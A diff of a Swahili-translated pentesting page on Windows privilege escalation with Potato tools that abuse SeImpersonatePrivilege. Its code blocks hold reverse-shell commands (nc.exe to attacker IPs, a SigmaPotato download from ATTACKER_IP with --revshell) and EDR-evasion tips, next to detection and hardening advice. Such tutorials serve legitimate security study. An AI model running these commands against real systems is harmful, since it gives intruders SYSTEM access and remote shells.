@@ -24,21 +24,22 @@ privilege-escalation-abusing-tokens.md
 
 ## Requirements and common gotchas
 
-All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:
+Mbinu zote zifuatazo zinategemea kuabusu huduma yenye uwezo wa impersonation yenye vibali kutoka kwa muktadha ambao unashikilia moja ya ya vibali vifuatavyo:
 
-- SeImpersonatePrivilege (maarufu zaidi) or SeAssignPrimaryTokenPrivilege
-- Ngazi ya uaminifu ya juu haitegemeeki ikiwa token tayari ina SeImpersonatePrivilege (kawaida kwa akaunti za huduma nyingi kama IIS AppPool, MSSQL, n.k.)
+- SeImpersonatePrivilege (ya kawaida zaidi) au SeAssignPrimaryTokenPrivilege
+- High integrity is not required if the token already has SeImpersonatePrivilege (kawaida kwa akaunti nyingi za huduma kama IIS AppPool, MSSQL, n.k.)
 
-Check privileges quickly:
+Angalia vibali haraka:
 ```cmd
 whoami /priv | findstr /i impersonate
 ```
-Operational notes:
+Vidokezo vya uendeshaji:
 
-- PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). In hardened environments where Spooler is disabled post-PrintNightmare, prefer RoguePotato/GodPotato/DCOMPotato/EfsPotato.
-- RoguePotato requires an OXID resolver reachable on TCP/135. If egress is blocked, use a redirector/port-forwarder (see example below). Older builds needed the -f flag.
-- EfsPotato/SharpEfsPotato abuse MS-EFSR; if one pipe is blocked, try alternative pipes (lsarpc, efsrpc, samr, lsass, netlogon).
-- Error 0x6d3 during RpcBindingSetAuthInfo typically indicates an unknown/unsupported RPC authentication service; try a different pipe/transport or ensure the target service is running.
+- Ikiwa shell yako inaendesha chini ya token iliyopunguzwa ambayo haijumuishi SeImpersonatePrivilege (kwa kawaida kwa Local Service/Network Service katika muktadha fulani), pata tena sifa za akaunti kwa kutumia FullPowers, kisha endesha Potato. Mfano: `FullPowers.exe -c "cmd /c whoami /priv" -z`
+- PrintSpoofer needs the Print Spooler service running and reachable over the local RPC endpoint (spoolss). Katika mazingira yaliyofungwa ambapo Spooler imezimwa baada ya PrintNightmare, pendelea RoguePotato/GodPotato/DCOMPotato/EfsPotato.
+- RoguePotato requires an OXID resolver reachable on TCP/135. Ikiwa egress imezuiwa, tumia redirector/port-forwarder (angalia mfano hapo chini). Toleo la zamani lilihitaji bendera -f.
+- EfsPotato/SharpEfsPotato wanatumia MS-EFSR; ikiwa pipa moja imezuiwa, jaribu pipa mbadala (lsarpc, efsrpc, samr, lsass, netlogon).
+- Error 0x6d3 during RpcBindingSetAuthInfo typically indicates an unknown/unsupported RPC authentication service; jaribu pipa/usafirishaji tofauti au hakikisha huduma lengwa inaendelea kuendesha.
 
 ## Demo ya Haraka
 
@@ -58,8 +59,8 @@ NULL
 
 ```
 Vidokezo:
-- Unaweza kutumia -i kuanzisha interactive process kwenye current console, au -c kuendesha one-liner.
-- Inahitaji Spooler service. Ikiwa imezimwa, hii itashindwa.
+- Unaweza kutumia -i kuanzisha interactive process katika console ya sasa, au -c kuendesha one-liner.
+- Inahitaji Spooler service. Ikiwa imezimwa, haitafanya kazi.
 
 ### RoguePotato
 ```bash
@@ -67,7 +68,7 @@ c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l
 # In some old versions you need to use the "-f" param
 c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
 ```
-Ikiwa outbound 135 imezuiwa, pivot the OXID resolver kupitia socat kwenye redirector yako:
+Ikiwa trafiki ya kwenda nje kwa port 135 imezuiwa, pivot OXID resolver kupitia socat kwenye redirector wako:
 ```bash
 # On attacker redirector (must listen on TCP/135 and forward to victim:9999)
 socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
@@ -111,7 +112,7 @@ CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes su
 
 nt authority\system
 ```
-Kidokezo: Ikiwa pipe moja inashindwa au EDR inaizuia, jaribu pipes nyingine zinazoungwa mkono:
+Kidokezo: Ikiwa pipa moja itashindwa au EDR italizuia, jaribu pipa nyingine zinazoungwa mkono:
 ```text
 EfsPotato <cmd> [pipe]
 pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
@@ -123,13 +124,13 @@ pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
 > GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 ```
 Vidokezo:
-- Inafanya kazi katika Windows 8/8.1–11 na Server 2012–2022 wakati SeImpersonatePrivilege ipo.
+- Inafanya kazi kwenye Windows 8/8.1–11 na Server 2012–2022 pale SeImpersonatePrivilege inapatikana.
 
 ### DCOMPotato
 
 ![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)
 
-DCOMPotato inatoa matoleo mawili zinazolenga service DCOM objects ambazo kwa chaguo-msingi huweka RPC_C_IMP_LEVEL_IMPERSONATE. Jenga au tumia binaries zilizotolewa kisha endesha amri yako:
+DCOMPotato inatoa toleo mbili zinazolenga service DCOM objects ambazo kwa chaguo-msingi hutumia RPC_C_IMP_LEVEL_IMPERSONATE. Jenga au tumia binaries zilizotolewa kisha endesha amri yako:
 ```cmd
 # PrinterNotify variant
 PrinterNotifyPotato.exe "cmd /c whoami"
@@ -137,9 +138,9 @@ PrinterNotifyPotato.exe "cmd /c whoami"
 # McpManagementService variant (Server 2022 also)
 McpManagementPotato.exe "cmd /c whoami"
 ```
-### SigmaPotato (imeboreshwa fork ya GodPotato)
+### SigmaPotato (fork ya GodPotato iliyosasishwa)
 
-SigmaPotato inaongeza vipengele vya kisasa kama in-memory execution kwa kutumia .NET reflection na PowerShell reverse shell helper.
+SigmaPotato inaongeza vipengele vya kisasa kama utekelezaji ndani ya kumbukumbu kupitia .NET reflection na msaidizi wa PowerShell reverse shell.
 ```powershell
 # Load and execute from memory (no disk touch)
 [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
@@ -148,13 +149,13 @@ SigmaPotato inaongeza vipengele vya kisasa kama in-memory execution kwa kutumia 
 # Or ask it to spawn a PS reverse shell
 [SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
 ```
-## Vidokezo vya ugundaji na kuimarisha
+## Utambuzi na vidokezo vya kuimarisha
 
-- Angalia processes zinazounda named pipes na mara moja kuita token-duplication APIs ikifuatiwa na CreateProcessAsUser/CreateProcessWithTokenW. Sysmon inaweza kuonyesha telemetry muhimu: Event ID 1 (process creation), 17/18 (named pipe created/connected), na command lines zinazozalisha child processes kama SYSTEM.
-- Spooler hardening: Kuizima Print Spooler service kwenye servers ambapo haitegemeiuzu huzuia PrintSpoofer-style local coercions kupitia spoolss.
-- Service account hardening: Punguza utoaji wa SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege kwa custom services. Fikiria kuendesha services chini ya virtual accounts zenye least privileges zinazohitajika na kuziwekea isolations kwa service SID na write-restricted tokens inapowezekana.
-- Network controls: Ku/block outbound TCP/135 au kuzuia RPC endpoint mapper traffic kunaweza kuvunja RoguePotato isipokuwa internal redirector ipo.
-- EDR/AV: Zana hizi zote zina signatures nyingi. Recompiling from source, kubadili majina ya symbols/strings, au kutumia in-memory execution kunaweza kupunguza detection lakini haitashinda behavioral detections imara.
+- Fuatilia mchakato unaounda named pipes na mara moja kuita token-duplication APIs ikifuatiwa na CreateProcessAsUser/CreateProcessWithTokenW. Sysmon inaweza kuonyesha telemetry muhimu: Event ID 1 (utengenezaji wa process), 17/18 (named pipe imeundwa/imeunganishwa), na mistari ya amri inayozalisha mchakato wa mtoto kama SYSTEM.
+- Spooler hardening: Kuzima huduma ya Print Spooler kwenye servers zisizohitajika kunazuia shambulio za ndani za aina ya PrintSpoofer kupitia spoolss.
+- Service account hardening: Punguza utoaji wa SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege kwa services maalum. Fikiria kuendesha services chini ya virtual accounts zenye vibali vya chini kabisa vinavyohitajika na kuzitenga kwa kutumia service SID na write-restricted tokens pale inapowezekana.
+- Network controls: Kuziba outbound TCP/135 au kupunguza trafiki ya RPC endpoint mapper kunaweza kuvunja RoguePotato isipokuwa redirector wa ndani upo.
+- EDR/AV: Zana hizi zote zina signatures nyingi. Kucompile tena kutoka source, kubadilisha symbols/strings, au kutumia utekelezaji kwa memory kunaweza kupunguza utambuzi lakini haitaweza kuzuia utambuzi wa tabia thabiti.
 
 ## Marejeo
 
@@ -167,5 +168,7 @@ SigmaPotato inaongeza vipengele vya kisasa kama in-memory execution kwa kutumia 
 - [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
 - [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
 - [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
+- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
+- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
 
 {{#include ../../banners/hacktricks-training.md}}
